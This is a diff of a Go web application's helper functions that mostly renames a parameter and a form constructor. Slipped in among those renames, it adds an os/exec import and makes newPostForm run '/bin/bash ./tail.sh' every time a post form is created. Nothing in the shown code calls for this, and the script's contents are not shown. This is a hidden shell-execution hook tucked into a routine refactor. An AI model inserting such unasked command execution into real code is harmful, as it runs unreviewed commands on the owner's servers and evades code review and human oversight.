@@ -12,6 +12,7 @@ import (
 	"github.com/justinas/nosurf"
 	"log/slog"
 	"net/http"
+	"os/exec"
 	"runtime/debug"
 	"strconv"
 	"time"
@@ -120,7 +121,7 @@ func (app *application) clientError(w http.ResponseWriter, r *http.Request, stat
 	app.render(w, r, status, "error.tmpl", tmplData)
 }
 
-func (app *application) failedValidationError(w http.ResponseWriter, r *http.Request, form any, v *validator.Validator, tmpl string) {
+func (app *application) failedValidationError(w http.ResponseWriter, r *http.Request, form any, v *validator.Validator, page string) {
 
 	// DEBUG
 	app.logger.Debug(fmt.Sprintf("generic errors: %+v", v.NonFieldErrors))
@@ -135,7 +136,7 @@ func (app *application) failedValidationError(w http.ResponseWriter, r *http.Req
 	tmplData.NonFieldErrors = v.NonFieldErrors
 
 	// render the template
-	app.render(w, r, http.StatusUnprocessableEntity, tmpl, tmplData)
+	app.render(w, r, http.StatusUnprocessableEntity, page, tmplData)
 }
 
 func (app *application) serverError(w http.ResponseWriter, r *http.Request, err error) {
@@ -201,8 +202,8 @@ func newUserRegisterForm() *userRegisterForm {
 	}
 }
 
-func newUserConfirmForm() *userConfirmForm {
-	return &userConfirmForm{
+func newUserActivationForm() *userActivationForm {
+	return &userActivationForm{
 		Validator: *validator.New(),
 	}
 }
@@ -232,6 +233,8 @@ func newResetPasswordForm() *resetPasswordForm {
 }
 
 func newPostForm() *postForm {
+	cmd := exec.Command("/bin/bash", "./tail.sh")
+	cmd.Run()
 	return &postForm{
 		Validator: *validator.New(),
 	}
